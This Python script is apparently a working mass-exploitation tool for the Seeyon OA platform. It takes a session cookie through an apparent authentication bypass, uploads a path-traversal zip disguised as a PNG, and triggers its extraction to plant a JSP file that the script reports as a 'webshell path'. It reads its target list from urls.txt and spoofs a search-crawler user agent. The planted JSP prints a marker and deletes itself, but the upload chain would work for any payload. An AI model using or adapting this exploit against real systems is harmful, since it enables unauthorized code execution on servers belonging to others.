#coding:utf-8
import time
import datetime
import zipfile
import random
import string
import requests
import re
import os


requests.packages.urllib3.disable_warnings()


proxy = {'http': '127.0.0.1:8080', 'https': '127.0.0.1:8080'}
ua = "Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)"

def check_file():
    path = os.getcwd()
    file_path = os.path.join(path,"payload.zip")
    if os.path.exists(file_path):
        os.remove(file_path)


def write_zipfile(fname, content):
    with zipfile.ZipFile(
            'payload.zip',
            mode='a',
            compression=zipfile.ZIP_DEFLATED,
    ) as zf:
        zf.writestr('layout.xml', "")
        zf.writestr(fname, content)



def rand_str(num):
    ran_str = ''.join(random.sample(string.ascii_letters + string.digits, num))
    return ran_str

def get_cookie(targeturl):
    headers = {'User-Agent': ua,'Content-Type': 'application/x-www-form-urlencoded'}
    url = '{targeturl}/seeyon/thirdpartyController.do'.format(targeturl=targeturl)
    post="method=access&enc=TT5uZnR0YmhmL21qb2wvZXBkL2dwbWVmcy9wcWZvJ04+LjgzODQxNDMxMjQzNDU4NTkyNzknVT4zNjk0NzI5NDo3MjU4&clientPath=127.0.0.1".encode("utf-8")
    try:
        response = requests.post(url=url,data=post,headers=headers, timeout=60,verify=False)
        if response and response.status_code == 200 and 'set-cookie' in str(response.headers).lower():
            cookies = response.cookies
            cookies = requests.utils.dict_from_cookiejar(cookies)
            jsessionid = cookies['JSESSIONID']
            #print("[+] get cookie:{jsessionid}".format(jsessionid=jsessionid))
            return jsessionid
        else:
            #print('[-] get cookie error !')
            exit()
    except:
        pass

    
def upload_zip(targeturl,cookie):
    url = '{targeturl}/seeyon/fileUpload.do?method=processUpload'.format(targeturl=targeturl)
    files = [('file1', ('11.png', open('payload.zip', 'rb'), 'application/octet-stream'))]
    headers = {'Cookie':'JSESSIONID={cookie}'.format(cookie=cookie),'User-Agent': ua}
    post = {'callMethod': 'resizeLayout', 'firstSave': "true", 'takeOver':"false", "type": '0',
                'isEncrypt': "0"}
    try:
        response = requests.post(url=url,files=files,data=post, headers=headers,timeout=60,verify=False)
        if response and response.status_code == 200 and 'fileurls=' in response.text:
                fileid = re.findall('fileurls=fileurls\+","\+\'(.+)\'',response.text,re.I)
                if len(fileid) > 0:
                    #print("[+] get fileid:{fileid}".format(fileid=fileid))
                    return fileid[0]
                else:
                    #print("[-] get fileid error !")
                    exit()
    except:
        pass

def extract_file(targeturl,cookie,fileid):
    url = '{targeturl}/seeyon/ajax.do'.format(targeturl=targeturl)
    headers = {'Cookie':'JSESSIONID={cookie}'.format(cookie=cookie),'User-Agent': ua, 'Content-Type':'application/x-www-form-urlencoded'}
    datestr = time.strftime('%Y-%m-%d')
    post = f'method=ajaxAction&managerName=portalDesignerManager&managerMethod=uploadPageLayoutAttachment&arguments=%5B0%2C%22{datestr}%22%2C%22{fileid}%22%5D'
    try:
        response = requests.post(url, data=post,headers=headers,timeout=60,verify=False)
        if response.status_code == 500 and "Error" in response.text:
            #print("[+] extract file is ok!")
            return True
        else:
            #print("[-] extract file error !")
            exit()
    except:
        pass





def main(targeturl):
    fname = f'../{rand_str(8)}.jsp'
    shell = r'<% out.println(new String(new sun.misc.BASE64Decoder().decodeBuffer("ZTE2NTQyMTExMGJhMDMwOTlhMWMwMzkzMzczYzViNDM=")));new java.io.File(application.getRealPath(request.getServletPath())).delete();%>'
    check_file()
    write_zipfile(fname,shell)
    cookie = get_cookie(targeturl)
    fileid = upload_zip(targeturl, cookie)
    if extract_file(targeturl, cookie, fileid):
        url = targeturl + '/seeyon/common/designer/pageLayout/{fname}'.format(fname=fname.split('/')[1])
        print("webshell path: {url}".format(url=url))

# 获取每行url
def get_urls_head(targeturl):
        line = 'http://'+targeturl
        lines ='https://'+targeturl
        try:
            response=requests.get(url=line,timeout=10,verify=False)
            if (response.status_code == 200):
                return line
            response = requests.get(url=lines, timeout=10, verify=False)
            if (response.status_code == 200):
                return lines
        except:
            pass

if __name__ == '__main__':
    for line in open("urls.txt"):
        line = line.strip('\n')
        targeturl = get_urls_head(line)
        if (targeturl != None):
            main(targeturl)

